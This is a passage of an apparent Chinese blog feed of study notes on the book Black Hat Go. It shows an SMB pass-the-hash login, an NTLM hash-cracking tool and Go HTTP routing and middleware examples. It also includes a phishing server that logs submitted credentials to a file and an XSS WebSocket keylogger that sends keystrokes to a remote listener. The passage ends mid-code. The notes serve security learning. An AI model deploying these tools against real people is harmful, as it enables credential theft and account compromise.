class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed [%s]: %s \n&quot;</span>,options.Host,err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Login successful [%s]\n&quot;</span>,options.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该代码与上面的代码基本上相似，不同的是我们这次在smb的结构体定义中直接使用了hash，然后在下面32行定义目标主机，直接将定义好的结构体发送。</p><h2 id="恢复NTLM密码"><a href="#恢复NTLM密码" class="headerlink" title="恢复NTLM密码"></a>恢复NTLM密码</h2><p>在某些情况下，我们仅仅使用密码散列不足以构成整个攻击链，，许多服务，如远程桌面等都不支持基于散列的身份验证。我们如果需要访问其中的一项服务，则我们需要明文密码。</p><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/ntlmssp&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;dictionarg/file&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">hash := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="built_in">len</span>(os.Args[<span class="number">4</span>])/<span class="number">2</span>)</span><br><span class="line">_, err := hex.Decode(hash, []<span class="type">byte</span>(os.Args[<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">f , err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> found <span class="type">string</span></span><br><span class="line">passwords := bytes.Split(f, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _, password := <span class="keyword">range</span> passwords &#123;</span><br><span class="line">h := ntlmssp.Ntowfv2(<span class="type">string</span>(password), os.Args[<span class="number">2</span>], os.Args[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(hash,h) &#123;</span><br><span class="line">found = <span class="type">string</span>(password)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> found != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Recovered password: %s\n&quot;</span>, found)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;[-] Failed to recover password&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码，我们首先将散列值作为命令行参数读取，然后将其解码为[]byte(18行)。然后遍历提供的密码字典，通过Ntowfv2函数来计算每个条目的散列值。最后将计算出的散列值与已提供的值进行对比，从而得到明文密码。</p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.HTTP服务器、路由和中间件</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/4.HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E8%B7%AF%E7%94%B1%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/4.HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E8%B7%AF%E7%94%B1%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTP服务端基础"><a href="#HTTP服务端基础" class="headerlink" title="HTTP服务端基础"></a>HTTP服务端基础</h3><h4 id="构造一个简单的echo服务器"><a href="#构造一个简单的echo服务器" class="headerlink" title="构造一个简单的echo服务器"></a>构造一个简单的echo服务器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   fmt.Fprintf(w, <span class="string">&quot;Hello %s\n&quot;</span>, r.URL.Query().Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   http.HandleFunc(<span class="string">&quot;/hello&quot;</span>, hello)</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230202233108262.png" alt="image-20230202233108262"></p><h4 id="简单路由器"><a href="#简单路由器" class="headerlink" title="简单路由器"></a>简单路由器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> router <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *router)</span></span> ServeHTTP(w http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">   <span class="keyword">switch</span> req.URL.Path &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;/a&quot;</span>:</span><br><span class="line">      fmt.Fprint(w, <span class="string">&quot;Executing /a&quot;</span>)</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      http.Error(w, <span class="string">&quot;404 Not Found&quot;</span>, <span class="number">404</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> r router</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, &amp;r)</span><br></pre></td></tr></table></figure><h4 id="简单的中间件"><a href="#简单的中间件" class="headerlink" title="简单的中间件"></a>简单的中间件</h4><ul><li>相比上一个简单路由器案例，这里有点像包装了一层的感觉</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logger <span class="keyword">struct</span> &#123;</span><br><span class="line">   Inner http.Handler <span class="comment">//接口http.Handler</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *logger)</span></span> ServeHTTP(w http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">   log.Printf(<span class="string">&quot;start %s\n&quot;</span>, time.Now().String())</span><br><span class="line">   l.Inner.ServeHTTP(w, req)</span><br><span class="line">   log.Printf(<span class="string">&quot;finish %s\n&quot;</span>, time.Now().String())</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">   fmt.Fprint(w, <span class="string">&quot;Hello\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f := http.HandlerFunc(hello)     <span class="comment">//使用http.HandlerFunc()中创建接口http.Handler</span></span><br><span class="line">   l := logger&#123;Inner: f&#125;            <span class="comment">//创建记录器，将字段Inner设置为新创建的处理程序。相比上一个简单路由器案例，这里有点像包装了一层的感觉</span></span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, &amp;l) <span class="comment">//指向记录器实例的指针来启动都武器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用gorilla-x2F-mux包进行路由"><a href="#使用gorilla-x2F-mux包进行路由" class="headerlink" title="使用gorilla&#x2F;mux包进行路由"></a>使用gorilla&#x2F;mux包进行路由</h4><p>本书P103</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter()</span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/azh3n&quot;</span>,</span><br><span class="line">      <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">         fmt.Fprint(w, <span class="string">&quot;goodbye W !&quot;</span>)</span><br><span class="line">      &#125;).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, r) <span class="comment">//注意这里后面不加&amp;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230126234806082.png" alt="image-20230126234806082"></p><h4 id="使用negroni包构建中间件"><a href="#使用negroni包构建中间件" class="headerlink" title="使用negroni包构建中间件"></a>使用negroni包构建中间件</h4><ul><li>拥有默认的中间件很好，但只有创建自己的中间件才能让negroni包发挥真正的作用</li><li>这里的<strong>ServeHTTP</strong>方法与之前不同，多了一个http.HandlerFunc参数，用于传递给下一个中间件的函数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127154605043.png" alt="image-20230127154605043"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127155021125.png" alt="image-20230127155021125"></p><ul><li>使用此方法编写中间件很方便，因为我们可以轻松地将执行传递给下一个中间件。但该方法也有一个缺点：无论编写什么都必须使用negroni包。例如，我们正在编写一个将安全标头写入响应的中间件包，希望它可以实现接口htp.Handler,这样就可以在其他应用程序栈中使用该接口，因为大多数程序栈都不太“欢迎”接口negroni.Handler。究其原因，无论中间件是什么用途，尝试在非negroni程序栈中使用negroni中间件时都可能会出现兼容性问题，反之亦然。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127155358560.png" alt="image-20230127155358560"></p><h4 id="使用negroni包添加身份验证"><a href="#使用negroni包添加身份验证" class="headerlink" title="使用negroni包添加身份验证"></a>使用negroni包添加身份验证</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> badAuth <span class="keyword">struct</span> &#123;</span><br><span class="line">   Username <span class="type">string</span></span><br><span class="line">   Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *badAuth)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) &#123;</span><br><span class="line">   username := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">   password := r.URL.Query().Get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> username != b.Username || password != b.Password &#123;</span><br><span class="line">      http.Error(w, <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   ctx := context.WithValue(r.Context(), <span class="string">&quot;username&quot;</span>, username) <span class="comment">//从请求中初始上下文。并在上下文中设置一个名为username的变量</span></span><br><span class="line">   r = r.WithContext(ctx)                                      <span class="comment">//请求使用新的上下文</span></span><br><span class="line">   next(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   username := r.Context().Value(<span class="string">&quot;username&quot;</span>).(<span class="type">string</span>) <span class="comment">//从请求上下文获取用户名</span></span><br><span class="line">   fmt.Fprintf(w, <span class="string">&quot;Hi %s\n&quot;</span>, username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter()                         <span class="comment">//创建路由器</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/hello&quot;</span>, hello).Methods(<span class="string">&quot;GET&quot;</span>) <span class="comment">//设置接口</span></span><br><span class="line">   n := negroni.Classic()                       <span class="comment">//使用默认的中间件(创建一个指向negroni实例的新指针)</span></span><br><span class="line">   n.Use(&amp;badAuth&#123;</span><br><span class="line">      Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">      Password: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">   &#125;)</span><br><span class="line">   n.UseHandler(r) <span class="comment">//将路由器添加到中间件堆栈</span></span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127211739949.png" alt="image-20230127211739949"></p><h4 id="使用模板生成HTML响应"><a href="#使用模板生成HTML响应" class="headerlink" title="使用模板生成HTML响应"></a>使用模板生成HTML响应</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    Hello &#123;&#123;.&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   t, err := template.New(<span class="string">&quot;hello&quot;</span>).Parse(x) <span class="comment">//创建一个新模板，调用Parse(x)对x内容进行解析，并返回一个指针</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   t.Execute(os.Stdout, <span class="string">&quot;&lt;script&gt;alert(&#x27;world&#x27;)&lt;/script&gt;&quot;</span>) <span class="comment">//第二个变量用于渲染模板的上下文</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127181816704.png" alt="image-20230127181816704"></p><h3 id="凭证收割"><a href="#凭证收割" class="headerlink" title="凭证收割"></a>凭证收割</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   log.WithFields(log.Fields&#123; <span class="comment">//日志记录并写出捕获的数据</span></span><br><span class="line">      <span class="string">&quot;time&quot;</span>:       time.Now().String(),</span><br><span class="line">      <span class="string">&quot;username&quot;</span>:   r.FormValue(<span class="string">&quot;_user&quot;</span>), <span class="comment">//捕获提交的用户名和密码</span></span><br><span class="line">      <span class="string">&quot;password&quot;</span>:   r.FormValue(<span class="string">&quot;_pass&quot;</span>),</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span>: r.UserAgent(),</span><br><span class="line">      <span class="string">&quot;ip_address&quot;</span>: r.RemoteAddr,</span><br><span class="line">   &#125;).Info(<span class="string">&quot;login attempt&quot;</span>)</span><br><span class="line">   http.Redirect(w, r, <span class="string">&quot;/&quot;</span>, <span class="number">302</span>) <span class="comment">//重定位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fh, err := os.OpenFile(<span class="string">&quot;credentials.txt&quot;</span>,</span><br><span class="line">      os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0600</span>) <span class="comment">//打开一个文件，用于存储</span></span><br><span class="line">   <span class="keyword">defer</span> fh.Close()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.SetOutput(fh) <span class="comment">//将日志内容写入fh文件句柄</span></span><br><span class="line"></span><br><span class="line">   r := mux.NewRouter()                                           <span class="comment">//创建新路由器</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/login&quot;</span>, login).Methods(<span class="string">&quot;POST&quot;</span>)                  <span class="comment">//使用处理函数login()</span></span><br><span class="line">   r.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.FileServer(http.Dir(<span class="string">&quot;public&quot;</span>))) <span class="comment">//启动服务器前，告诉路由器从一个目录中提供静态文件(HTML,JS,图片)</span></span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127214224180.png" alt="image-20230127214224180"></p><h3 id="利用XSS获取用户输入内容-使用WebSocket-API-实现按键记录"><a href="#利用XSS获取用户输入内容-使用WebSocket-API-实现按键记录" class="headerlink" title="利用XSS获取用户输入内容(使用WebSocket API 实现按键记录)"></a>利用XSS获取用户输入内容(使用WebSocket API 实现按键记录)</h3><ul><li><p>WebSocket 对于构建诸如聊天和游戏之类的实时应用程序很有用</p></li><li><p>但也可以用于邪恶的目的，例如键盘记录器</p><h5 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCRTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;http://127.0.0.1:8080/k.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;/login&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;usrename&#x27;</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="logger-js"><a href="#logger-js" class="headerlink" title="logger.js"></a>logger.js</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&#123;&#123;.&#125;&#125;/ws&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">        s = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(evt.<span class="property">which</span>);</span><br><span class="line">        conn.<span class="title function_">send</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h5 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h5></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   upgrader = websocket.Upgrader&#123;</span><br><span class="line">      CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">   &#125;</span><br><span class="line">   listenAddr <span class="type">string</span></span><br><span class="line">   wsAddr     <span class="type">string</span></span><br><span class="line">   jsTemplate *template.Template</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123; <span class="comment">//init内置函数</span></span><br><span class="line">   flag.StringVar(&amp;listenAddr, <span class="string">&quot;listen-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address to listen on&quot;</span>)</span><br><span class="line">   flag.StringVar(&amp;wsAddr, <span class="string">&quot;ws-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address for WebSocket connection&quot;</span>)</span><br><span class="line">   flag.Parse()</span><br><span class="line">   jsTemplate, _ = template.ParseFiles(<span class="string">&quot;logger.js&quot;</span>) <span class="comment">//用来解析存储在logger.js文件中的go模版</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveWS</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>) <span class="comment">//方法Upgrade实现了升级HTTP连接使用WebSocket协议, 会有一个连接conn</span></span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(w, <span class="string">&quot;&quot;</span>, <span class="number">500</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">&quot;Connection from %s\n&quot;</span>, conn.RemoteAddr().String()) <span class="comment">//打印出连接端的地址</span></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      _, msg, err := conn.ReadMessage() <span class="comment">//读取内容，到缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      fmt.Printf(<span 